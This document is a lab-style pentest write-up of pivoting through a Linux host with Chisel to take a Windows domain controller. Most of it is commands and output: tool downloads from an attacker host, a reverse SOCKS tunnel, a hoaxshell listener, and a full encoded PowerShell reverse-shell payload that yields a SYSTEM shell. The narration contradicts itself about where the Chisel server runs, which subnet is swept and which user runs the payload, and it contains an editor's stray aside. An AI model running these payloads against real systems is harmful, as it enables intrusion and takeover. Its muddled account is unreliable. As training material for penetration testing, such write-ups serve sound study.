# Summary

This exercise focused on using Chisel for pivoting. After gaining initial access to a Linux host, a Chisel server was set up on the attacker's machine. The Chisel client was then executed on the target to create a reverse SOCKS5 proxy and a specific port forward. This tunnel allowed tools running on the attacker's machine to interact with hosts on the otherwise inaccessible internal network, ultimately enabling the targeting and compromise of the Windows Domain Controller.

## **Explanation**

A connection was established to the SSH server at 10.10.11.70 for the user 'pentest'. The server presented a host key for verification. The next step is to provide the password for the pentest user to complete the authentication process.

```bash
ssh pentest@10.10.11.70
```

# The **ifconfig** command reveals the network configuration of the compromised host. The primary network interface, ens5, has the IPv4 address 10.10.211.70 with a netmask of 255.255.255.240, placing it on the 10.10.211.64/28 network. This confirms the host is on an internal network segment, and the local loopback interface lo is also present and active.


```bash
pentest@frajmp:/tmp$ ifconfig
```

```output
ens5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.211.70  netmask 255.255.255.240  broadcast 10.10.211.79
        inet6 fe80::825:d3ff:fe1c:201f  prefixlen 64  scopeid 0x20<link>
        ether 0a:25:d3:1c:20:1f  txqueuelen 1000  (Ethernet)
        RX packets 345  bytes 60798 (60.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 469  bytes 66880 (66.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

A ping sweep of the 10.10.211.0/28 subnet was conducted to discover live hosts. The scan successfully identified two active hosts besides the current machine: 10.10.211.65, which appears to be a Linux system, and 10.10.211.69, which appears to be a Windows system based on its TTL of 128. The current host, 10.10.211.70, also responded to its own ping.

```bash
for i in $(seq 254); do ping 10.10.211.${i} -c1 -W1 & done | grep from
```

```bash
64 bytes from 10.10.211.70: icmp_seq=1 ttl=64 time=0.019 ms
ping: Do you want to ping broadcast? Then -b. If not, check your local firewall rules
64 bytes from 10.10.211.65: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 10.10.211.69: icmp_seq=1 ttl=128 time=0.318 ms

```

A Python HTTP server was started on port 8000 to host tools

```bash
python3 -m http.server 8000
```

 The nmap binary was then successfully transferred to the target machine using wget, retrieving it from the attacking machine at 10.8.7.96. This prepares the target for network scanning and further enumeration.

```bash
wget http://10.8.7.96:8000/nmap
```

An Nmap scan was executed against the local host, 10.10.211.70. The scan confirmed that only a single port is open: port 22 running the SSH service. This indicates a minimal attack surface on this specific machine from the network.

```bash
./nmap 10.10.211.70 
```

```output
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2025-10-07 23:19 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 10.10.211.70
Host is up (0.00011s latency).
Not shown: 1155 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
```

An Nmap scan of the host 10.10.211.69 revealed a Windows Domain Controller. Key services identified include DNS on port 53, a web server on port 80, Kerberos on port 88, and SMB on ports 139 and 445. Additional critical services are LDAP on port 389 and Remote Desktop on port 3389, confirming the host's role as a central authentication and management server.

```bash
./nmap 10.10.211.69
```

```output
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos
135/tcp  open  epmap
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd
593/tcp  open  unknown
636/tcp  open  ldaps
3389/tcp open  ms-wbt-server
```

The command to download the chisel-linux binary was initiated. The provided text "we get another ssh and get" appears to be an incomplete note. The next logical step would be to make the binary executable and then use it to establish a tunnel, likely to forward a port from the target network to the attacker's machine for further access.

```bash
 wget http://10.8.7.96:8000/chisel-linux 
```
The Chisel binary was executed in server mode, configured for a reverse SOCKS5 proxy on port 3000. This command sets up the compromised host to act as a proxy server, waiting for a connection from the attacker's Chisel client to establish a tunnel for routing traffic into the target network.

```bash
./chisel-linux  server --reverse --socks5 -p 3000
```

A Chisel client was started on the target machine, connecting back to the attacker's server at 10.8.7.96:3000. The client established a reverse port forward, binding local port 9999 on the target to the attacker's port 9999. This creates a tunnel, allowing the attacker to access services on the target's local network through this forwarded port.

```bash
./chisel-linux  client --fingerprint 4yQyN7DA01jIOEPDmMZhWcQ8tMbPs3naDPKxNla01BA=   10.8.7.96:3000  0.0.0.0:9999:10.8.7.96:9999 
```

The hoaxshell.py script was launched, setting up a listener on the target machine at IP 10.10.211.70 and port 9999. This command initiates a reverse shell server, awaiting an incoming connection from a victim to provide a shell session. The use of port 9999 aligns with the previously established Chisel tunnel for command and control.
```bash
python  hoaxshell.py -s 10.10.211.70 -p 9999 
```

A PowerShell payload was generated by hoaxshell for a reverse shell connection. The encoded command will connect back to the listener at 10.10.211.70 on port 9999. This payload is designed to be executed on a Windows host to establish a shell session through the existing Chisel tunnel, providing command execution on the target Windows machine.

```output
powershell -e JABzAD0AJwAxADAALgAxADAALgAyADEAMQAuADcAMAA6ADkAOQA5ADkAJwA7ACQAaQA9ACcANABjADQAOABiAGEAZQBhAC0ANAAwADQAMgA3AGIAYQAwAC0AMgBjAGEAMgAwAGEAMQA1ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADQAYwA0ADgAYgBhAGUAYQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAxAGYANwAzAC0AMQBiAGIANAAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA0ADAANAAyADcAYgBhADAAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMQBmADcAMwAtADEAYgBiADQAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AMgBjAGEAMgAwAGEAMQA1ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMQBmADcAMwAtADEAYgBiADQAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA==  

```

The encoded PowerShell payload was executed on the Windows host as the Administrator user. This command established a reverse shell connection back to the hoaxshell listener at 10.10.211.70:9999, successfully granting a command shell with the highest level of privileges on the domain controller, thereby completing the compromise of the target.

```bash
PS C:\users\Administrator> 
powershell -e JABzAD0AJwAxADAALgAxADAALgAyADEAMQAuADcAMAA6ADkAOQA5ADkAJwA7ACQAaQA9ACcANABjADQAOABiAGEAZQBhAC0ANAAwADQAMgA3AGIAYQAwAC0AMgBjAGEAMgAwAGEAMQA1ACcAOwAkAHAAPQAnAGgAdAB0AHAAOgAvAC8AJwA7ACQAdgA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAFUAcgBpACAAJABwACQAcwAvADQAYwA0ADgAYgBhAGUAYQAgAC0ASABlAGEAZABlAHIAcwAgAEAAewAiAFgALQAxAGYANwAzAC0AMQBiAGIANAAiAD0AJABpAH0AOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsAJABjAD0AKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACAALQBVAHIAaQAgACQAcAAkAHMALwA0ADAANAAyADcAYgBhADAAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMQBmADcAMwAtADEAYgBiADQAIgA9ACQAaQB9ACkALgBDAG8AbgB0AGUAbgB0ADsAaQBmACAAKAAkAGMAIAAtAG4AZQAgACcATgBvAG4AZQAnACkAIAB7ACQAcgA9AGkAZQB4ACAAJABjACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAHQAbwBwACAALQBFAHIAcgBvAHIAVgBhAHIAaQBhAGIAbABlACAAZQA7ACQAcgA9AE8AdQB0AC0AUwB0AHIAaQBuAGcAIAAtAEkAbgBwAHUAdABPAGIAagBlAGMAdAAgACQAcgA7ACQAdAA9AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHAAJABzAC8AMgBjAGEAMgAwAGEAMQA1ACAALQBNAGUAdABoAG8AZAAgAFAATwBTAFQAIAAtAEgAZQBhAGQAZQByAHMAIABAAHsAIgBYAC0AMQBmADcAMwAtADEAYgBiADQAIgA9ACQAaQB9ACAALQBCAG8AZAB5ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAJABlACsAJAByACkAIAAtAGoAbwBpAG4AIAAnACAAJwApAH0AIABzAGwAZQBlAHAAIAAwAC4AOAB9AA== 

```

A reverse shell was successfully established on the Windows host. The command `whoami` confirmed that the shell is running with the highest level of privileges as `nt authority\system`. This indicates a complete compromise of the domain controller, providing full control over the system and the Active Directory domain.


```bash
PS C:\users\Administrator > whoami
nt authority\system
                    

```



